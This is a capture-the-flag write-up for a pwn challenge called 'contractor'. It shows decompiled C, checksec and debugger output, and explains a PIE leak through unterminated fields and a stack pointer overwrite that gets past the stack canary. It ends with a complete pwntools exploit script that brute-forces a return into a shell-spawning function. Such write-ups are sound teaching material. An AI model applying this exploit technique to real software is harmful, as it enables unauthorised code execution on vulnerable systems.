* Description

Sir Alaric calls upon the bravest adventures to join him in assembling the mightiest army in all of
Eldoria. Together, you will safeguard the peace across the villages under his protection. Do you
have the courage to answer the call?

* Solution
** Preliminary analysis
The program normal do something like following:
[[file:2025-04-20_10-53.png]]

Let's load it into disassembler to see what's the internal detail.
#+begin_src c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *v3; // rsp
  int s_; // [rsp+8h] [rbp-20h] BYREF
  int v6; // [rsp+Ch] [rbp-1Ch]
  void *s; // [rsp+10h] [rbp-18h]
  char s1[4]; // [rsp+1Ch] [rbp-Ch] BYREF
  unsigned __int64 v9; // [rsp+20h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  v3 = alloca(0x130);
  s = &s_;
  memset(&s_, 0, 0x128u);
  printf(
    "%s[%sSir Alaric%s]: Young lad, I'm truly glad you want to join forces with me, but first I need you to tell me some "
    "things about you.. Please introduce yourself. What is your name?\n"
    "\n"
    "> ",
    "\x1B[1;34m",
    "\x1B[1;33m",
    "\x1B[1;34m");
  for ( i = 0; (unsigned int)i <= 0xF; ++i )
  {
    read(0, &safe_buffer, 1u);
    if ( safe_buffer == '\n' )
      break;
    *((_BYTE *)s + i) = safe_buffer;
  }
  printf(
    "\n[%sSir Alaric%s]: Excellent! Now can you tell me the reason you want to join me?\n\n> ",
    "\x1B[1;33m",
    "\x1B[1;34m");
  for ( i = 0; (unsigned int)i <= 0xFF; ++i )
  {
    read(0, &safe_buffer, 1u);
    if ( safe_buffer == 10 )
      break;
    *((_BYTE *)s + i + 16) = safe_buffer;
  }
  printf(
    "\n[%sSir Alaric%s]: That's quite the reason why! And what is your age again?\n\n> ",
    "\x1B[1;33m",
    "\x1B[1;34m");
  __isoc99_scanf("%ld", (char *)s + 272);
  printf(
    "\n"
    "[%sSir Alaric%s]: You sound mature and experienced! One last thing, you have a certain specialty in combat?\n"
    "\n"
    "> ",
    "\x1B[1;33m",
    "\x1B[1;34m");
  for ( i = 0; (unsigned int)i <= 0xF; ++i )
  {
    read(0, &safe_buffer, 1u);
    if ( safe_buffer == 10 )
      break;
    *((_BYTE *)s + i + 280) = safe_buffer;
  }
  printf(
    "\n"
    "[%sSir Alaric%s]: So, to sum things up: \n"
    "\n"
    "+------------------------------------------------------------------------+\n"
    "\n"
    "\t[Name]: %s\n"
    "\t[Reason to join]: %s\n"
    "\t[Age]: %ld\n"
    "\t[Specialty]: %s\n"
    "\n"
    "+------------------------------------------------------------------------+\n"
    "\n",
    "\x1B[1;33m",
    "\x1B[1;34m",
    (const char *)s,
    (const char *)s + 16,
    *((_QWORD *)s + 34),
    (const char *)s + 280);
  v6 = 0;
  printf(
    "[%sSir Alaric%s]: Please review and verify that your information is true and correct.\n",
    "\x1B[1;33m",
    "\x1B[1;34m");
  do
  {
    printf("\n1. Name      2. Reason\n3. Age       4. Specialty\n\n> ");
    __isoc99_scanf("%d", &s_);
    if ( s_ == 4 )
    {
      printf("\n%s[%sSir Alaric%s]: And what are you good at: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
      for ( i = 0; (unsigned int)i <= 0xFF; ++i )
      {
        read(0, &safe_buffer, 1u);
        if ( safe_buffer == 10 )
          break;
        *((_BYTE *)s + i + 280) = safe_buffer;
      }
      ++v6;
    }
    else
    {
      if ( s_ > 4 )
        goto LABEL_36;
      switch ( s_ )
      {
        case 3:
          printf(
            "\n%s[%sSir Alaric%s]: Did you say you are 120 years old? Please specify again: ",
            "\x1B[1;34m",
            "\x1B[1;33m",
            "\x1B[1;34m");
          __isoc99_scanf("%d", (char *)s + 272);
          ++v6;
          break;
        case 1:
          printf("\n%s[%sSir Alaric%s]: Say your name again: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
          for ( i = 0; (unsigned int)i <= 0xF; ++i )
          {
            read(0, &safe_buffer, 1u);
            if ( safe_buffer == 10 )
              break;
            *((_BYTE *)s + i) = safe_buffer;
          }
          ++v6;
          break;
        case 2:
          printf("\n%s[%sSir Alaric%s]: Specify the reason again please: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
          for ( i = 0; (unsigned int)i <= 0xFF; ++i )
          {
            read(0, &safe_buffer, 1u);
            if ( safe_buffer == 10 )
              break;
            *((_BYTE *)s + i + 16) = safe_buffer;
          }
          ++v6;
          break;
        default:
LABEL_36:
          printf("\n%s[%sSir Alaric%s]: Are you mocking me kid??\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
          exit(1312);
      }
    }
    if ( v6 == 1 )
    {
      printf(
        "\n%s[%sSir Alaric%s]: I suppose everything is correct now?\n\n> ",
        "\x1B[1;34m",
        "\x1B[1;33m",
        "\x1B[1;34m");
      for ( i = 0; (unsigned int)i <= 3; ++i )
      {
        read(0, &safe_buffer, 1u);
        if ( safe_buffer == 10 )
          break;
        s1[i] = safe_buffer;
      }
      if ( !strncmp(s1, "Yes", 3u) )
        break;
    }
  }
  while ( v6 <= 1 );
  printf("\n%s[%sSir Alaric%s]: We are ready to recruit you young lad!\n\n", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  return 0;
}
#+end_src

#+begin_src bash
❯ checksec dist/contractor
[*] '/home/curtain/Documents/ctf/2025/apocalypse-35/pwn/constractor/dist/contractor'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
#+end_src

** PIE base address leak
This ~main~ function seems like a little big, let's break it down:
1. ~alloca(0x130)~ just allocate memory on stack, the following =GDB= debug will verify that just
   something like ~sub rsp, 0x130~.
   [[file:2025-04-20_12-01.png]]
2. zero out the first ~0x128~ bytes for program use, then read 4 fields separately, *Please note that 
   all the fields are not NULL terminated*. Combined with point 1 and 3, we can leverage this to leak
   the =PIE= base address.
3. after get all field, print it out to =stdout.=
   
We can create struct for that informations:
#+begin_src c
struct PersonInfo {
    char name[0x10];
    char reason[0x100];
    long age;
    char specialty[0x10];
};
#+end_src

** Bypass stack canary and overwrite return address
After exhibit ~PersonInfo~ to user, the program give one chance to review and correct the information.
*But within the number 4 field, which is ~specialty~, there's a buffer overflow exist!*
#+begin_src c
if ( s_ == 4 )
{
      printf("\n%s[%sSir Alaric%s]: And what are you good at: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
      for ( i = 0; (unsigned int)i <= 0xFF; ++i )
      {
        read(0, &safe_buffer, 1u);
        if ( safe_buffer == 10 )
          break;
        *((_BYTE *)s + i + 280) = safe_buffer;
      }
      ++v6;
}
#+end_src

Remember that field only have ~0x10~ length, but here we can read in ~0x100~ bytes. Luckily, and buffer
pointer behind that field by chance.
#+begin_src c
void *s; // [rsp+10h] [rbp-18h]
#+end_src

#+begin_src bash
pwndbg> x/50gx $rsp
0x7fffffffd5f0: 0x0000000000000000      0x0000000000000000
0x7fffffffd600: 0x0000000000000000      0x0000000000000000
0x7fffffffd610: 0x0000000000000000      0x0000000000000000
0x7fffffffd620: 0x0000000000000000      0x0000000000000000
0x7fffffffd630: 0x0000000000000000      0x0000000000000000
0x7fffffffd640: 0x0000000000000000      0x0000000000000000
0x7fffffffd650: 0x0000000000000000      0x0000000000000000
0x7fffffffd660: 0x0000000000000000      0x0000000000000000
0x7fffffffd670: 0x0000000000000000      0x0000000000000000
0x7fffffffd680: 0x0000000000000000      0x0000000000000000
0x7fffffffd690: 0x0000000000000000      0x0000000000000000
0x7fffffffd6a0: 0x0000000000000000      0x0000000000000000
0x7fffffffd6b0: 0x0000000000000000      0x0000000000000000
0x7fffffffd6c0: 0x0000000000000000      0x0000000000000000
0x7fffffffd6d0: 0x0000000000000000      0x0000000000000000
0x7fffffffd6e0: 0x0000000000000000      0x0000000000000000
0x7fffffffd6f0: 0x0000000000000000      0x0000000000000000
0x7fffffffd700: 0x0000000000000000      0x0000000000000000 # specialty field
0x7fffffffd710: 0x0000000000000000      0x0000555555555b50
0x7fffffffd720: 0x0000000000000000      0x00007fffffffd5f0 # `s` pointer
0x7fffffffd730: 0x00007fffffffd830      0xa37e3db37979ea00 # canary
0x7fffffffd740: 0x0000000000000000      0x00007ffff7df9083 # return address
0x7fffffffd750: 0x00007ffff7ffc620      0x00007fffffffd838
0x7fffffffd760: 0x0000000100000000      0x0000555555555441
0x7fffffffd770: 0x0000555555555b50      0x1910efebb5ebd6c6
#+end_src

So we can overwrite that ~s~ pointer's last byte (casuse ~read~ byte one by one) to =return address='s
address first, there is 1/16 chance for us (cause last lower bibble must be ~0xf~, see below
assignment, when we overwrite ~s~'s last byte, the next ~i~ index is ~0x21~, for alignment, so the higher
nibble can be 1/16 chance to success). then in the next loop we can overwrite return address
directly without bother canary at all.     
#+begin_src c
// offset_specialty2s = 0x20
,*(s + i + 0x118) = safe_buffer
#+end_src

BTW, there's ~win~ function within the binary:
#+begin_src c
unsigned __int64 contract()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  execl("/bin/sh", "sh", 0);
  return __readfsqword(0x28u) ^ v1;
}
#+end_src

** Script
#+begin_src python :results output
#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'
context.log_level = 'critical'

cnt = 1
fname = './contractor'

while True:
    io = process(fname)

    elf = ELF(fname, checksec=False)

    try:
        _ = io.sendlineafter(b'> ', b'A')
        _ = io.sendlineafter(b'> ', b'B')
        _ = io.sendlineafter(b'> ', b'1')
        _ = io.sendlineafter(b'> ', b'D' * 0x10)

        _ = io.recvuntil(b'D' * 0x10)
        pie_leak = u64(io.recvline().strip().ljust(8, b'\x00'))
        elf.address = pie_leak - 0x1b50
        # IDEA: \r + end='' to achieve the goal that only display last successful try
        print(f'\r{cnt} pie_leak: {pie_leak:#x}, pie_base: {elf.address:#x}', end='')

        # for overflow
        win = elf.sym['contract']
        _ = io.sendlineafter(b'> ', b'4')
        # $rbp - 0x1c -> while loop cnt, overwrite a number > 1 will jump out loop, so this method don't need send 'Yes'.
        payload = b'\x00' * 0x18 + b'B' * 8 # fill gaps
        payload += b'\x2f' # lower nibble f must be there, higher nibble is guess
        payload += p64(win)
        _ = io.sendlineafter(b': ', payload)

        io.sendline(b'cat flag*')
        flag = io.recvline_contains(b'HTB', timeout=0.2)

        if b'HTB' in flag:
            print(f'\n{cnt} {flag.decode()}')
            io.close()
            # BUG: this just raise SystemExit() Exception, will be capture by folloing except if
            # that not limited to EOFError, which cause dead loop
            exit()
    except EOFError as e:
        cnt += 1
        io.close()
#+end_src
